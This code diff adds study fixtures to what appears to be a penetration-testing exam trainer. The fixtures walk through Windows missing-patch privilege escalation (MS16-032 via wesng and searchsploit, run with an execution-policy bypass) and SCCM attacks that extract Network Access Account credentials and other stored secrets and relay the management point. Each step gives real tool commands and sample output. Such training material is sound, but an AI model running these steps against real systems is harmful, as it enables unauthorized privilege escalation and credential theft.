@@ -4386,4 +4386,219 @@
   };
   Object.keys(GAPFILL2).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL2[k]; });
 
+  // --- Phase-A gap-fill: Windows patch-gap exploitation + SCCM exploitation ---
+  var GAPFILL3 = {
+    "windows-patch-exploit": {
+      "why": "A Windows host missing a patch hands you SYSTEM through a public exploit, exactly as a vulnerable Linux kernel does. wesng (offline, against systeminfo) or Watson (on-box) compares the installed hotfixes to the patch database and names the missing ones that carry a known local exploit. The discipline is the same as the Linux side: confirm the exact build, match a public PoC to a named KB or CVE, read it, and run a precompiled binary where you can so a bad compile does not burn the session. The exam-relevant set is small (the secondary-logon and printing bugs, the token ones), so learn to spot them straight from systeminfo.",
+      "cmd": "systeminfo",
+      "tool": "cmd",
+      "output": "OS Name:        Microsoft Windows Server 2016 Standard\nOS Version:     10.0.14393 N/A Build 14393\nHotfix(s):      3 Hotfix(s) Installed.",
+      "signal": "Build 14393",
+      "teach": "Build 14393 with only three hotfixes is badly behind. Feed systeminfo to wesng (or run Watson on-box) to name a missing KB with a public local exploit, then run the matched, precompiled PoC and confirm SYSTEM.",
+      "leadup": [
+        {
+          "key": "foothold",
+          "label": "You have a shell, no token lead",
+          "steps": [
+            {
+              "title": "No useful privilege",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /priv",
+              "out": "SeChangeNotifyPrivilege           Enabled\nSeIncreaseWorkingSetPrivilege     Disabled",
+              "sig": "SeChangeNotifyPrivilege",
+              "teach": "No SeImpersonate or other abusable token here, so a missing-patch exploit is a real lead."
+            }
+          ]
+        },
+        {
+          "key": "wesng",
+          "label": "wesng flagged a missing patch",
+          "steps": [
+            {
+              "title": "Diff the hotfixes",
+              "tool": "wesng",
+              "where": "local",
+              "cmd": "wes.py systeminfo.txt --exploits-only",
+              "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)\n    Exploit: https://www.exploit-db.com/exploits/39719",
+              "sig": "MS16-032",
+              "teach": "A named bug with a public exploit is the target; MS16-032 has a reliable PowerShell PoC."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Patch-gap LPE is confirm the build, name a missing KB with a public exploit, read it, run it.",
+        "items": [
+          {
+            "t": "Capture the build and hotfixes",
+            "d": "systeminfo gives the exact OS build and the installed hotfixes, which is everything wesng needs to diff offline.",
+            "demo": [
+              {
+                "run": "systeminfo > systeminfo.txt",
+                "out": "OS Version: 10.0.14393 N/A Build 14393",
+                "sig": "Build 14393"
+              }
+            ],
+            "note": "Run wesng offline on your box so you do not upload tools you do not need."
+          },
+          {
+            "t": "Name a missing patch with a public exploit",
+            "d": "wesng (offline) or Watson/Sherlock (on-box) maps the gaps to known local exploits, newest and most reliable first.",
+            "demo": [
+              {
+                "run": "wes.py systeminfo.txt --exploits-only",
+                "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)",
+                "sig": "MS16-032"
+              }
+            ],
+            "note": "Prefer a bug with a stable, precompiled PoC over an exotic one that may crash the box."
+          },
+          {
+            "t": "Find and read the PoC",
+            "d": "searchsploit the KB or CVE, read what it does, and pick a precompiled binary where one exists.",
+            "demo": [
+              {
+                "run": "searchsploit MS16-032",
+                "out": "MS16-032 Secondary Logon Handle Privilege Escalation | windows/local/39719.ps1",
+                "sig": "windows/local/39719.ps1"
+              }
+            ],
+            "note": "Reading first means a reboot or crash is a choice, not a surprise."
+          },
+          {
+            "t": "Run it and confirm SYSTEM",
+            "d": "Run the matched exploit and check the resulting context before anything else.",
+            "demo": [
+              {
+                "run": "powershell -ep bypass .\\Invoke-MS16032.ps1; whoami",
+                "out": "nt authority\\system",
+                "sig": "nt authority\\system"
+              }
+            ],
+            "note": "A SYSTEM context confirms the escalation; capture proof."
+          }
+        ]
+      },
+      "situation": "You have a shell on Windows Server 2016, whoami /priv shows nothing abusable, and wesng flags a missing KB with a public exploit. What is the move?",
+      "choices": [
+        "windows-patch-exploit",
+        "seimpersonate",
+        "windows-enum",
+        "wesng-patch-gaps"
+      ],
+      "coach": {
+        "seimpersonate": "whoami /priv has no SeImpersonate, so the Potato path is not available here.",
+        "windows-enum": "You already enumerated and wesng found the lead; now exploit the missing patch.",
+        "wesng-patch-gaps": "That is how you found the missing KB; the next step is running the matched exploit."
+      }
+    },
+    "sccm-exploit": {
+      "why": "Enumerating SCCM is only the setup; the payoff is the Network Access Account, a domain credential every SCCM client uses to reach content, stored on the management point and recoverable by any authenticated domain user. SharpSCCM pulls it and decrypts it client-side, handing you a domain account you did not have. Beyond the NAA, a management point that accepts NTLM can be coerced or relayed for a site takeover, and task-sequence variables sometimes carry still more secrets. Once the site is mapped, go straight for the NAA, it is the reliable, low-noise win that feeds the rest of the domain attack.",
+      "cmd": "SharpSCCM.exe get naa",
+      "tool": "SharpSCCM",
+      "output": "[+] Retrieved Network Access Account credential:\n    Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
+      "signal": "Username: ACME\\svc_sccm",
+      "teach": "The NAA is a real domain account (svc_sccm) you can now use. Validate it, then feed it into the credential loop, it often has access the account you started with did not.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "You are authenticated",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc smb {{target}} -u {{user}} -p {{password}}",
+              "out": "SMB  10.10.10.10  445  DC01  [+] acme.internal\\bob:Spring2024",
+              "sig": "[+] acme.internal\\bob",
+              "teach": "Any valid domain account can read the NAA from a management point, you do not need admin."
+            }
+          ]
+        },
+        {
+          "key": "site",
+          "label": "sccmhunter found a management point",
+          "steps": [
+            {
+              "title": "Map the SCCM site",
+              "tool": "sccmhunter",
+              "where": "local",
+              "cmd": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
+              "out": "[+] Found management point: MP01.acme.internal\n[+] Site code: ACM",
+              "sig": "Found management point",
+              "teach": "A management point plus a site code is all SharpSCCM needs to request the NAA."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "SCCM abuse is map the site, pull the NAA, dump any other secrets, and relay the management point where you can.",
+        "items": [
+          {
+            "t": "Map the SCCM roles",
+            "d": "sccmhunter (or SharpSCCM) enumerates the SMS provider, management points, and site code over SMB/LDAP.",
+            "demo": [
+              {
+                "run": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
+                "out": "[+] Found management point: MP01.acme.internal",
+                "sig": "Found management point"
+              }
+            ],
+            "note": "You need the management point and site code before requesting secrets."
+          },
+          {
+            "t": "Pull the Network Access Account",
+            "d": "SharpSCCM requests the NAA policy from the management point and decrypts the credential client-side.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe get naa",
+                "out": "Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
+                "sig": "Username: ACME\\svc_sccm"
+              }
+            ],
+            "note": "The NAA is a domain account; it often reaches hosts your starting account could not."
+          },
+          {
+            "t": "Dump any other stored secrets",
+            "d": "Collection variables and task-sequence steps sometimes carry further credentials.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe get secrets",
+                "out": "[+] Task sequence credential: ACME\\deploy : D3ployP@ss",
+                "sig": "Task sequence credential"
+              }
+            ],
+            "note": "Treat each recovered secret as a candidate to validate and reuse."
+          },
+          {
+            "t": "Relay the management point",
+            "d": "Where the MP accepts NTLM, coerce or relay its machine account for client push / site takeover; otherwise the NAA alone usually moves you forward.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe invoke admin-service -r {{relay_target}}",
+                "out": "[+] Coerced authentication from MP01$",
+                "sig": "Coerced authentication"
+              }
+            ],
+            "note": "Relay is the escalation; the NAA is the dependable baseline."
+          }
+        ]
+      },
+      "situation": "You hold a domain credential and sccmhunter found an SCCM management point. What is the highest-value next move?",
+      "choices": [
+        "sccm-exploit",
+        "sccm-enum",
+        "kerberoast",
+        "bloodhound-collect"
+      ],
+      "coach": {
+        "sccm-enum": "That is how you found the management point; now pull the NAA credential it stores.",
+        "kerberoast": "Roasting is worth doing, but the NAA is a reliable, immediate domain credential right here.",
+        "bloodhound-collect": "You already have graph data; the SCCM NAA is a concrete credential to take now."
+      }
+    }
+  };
+  Object.keys(GAPFILL3).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL3[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
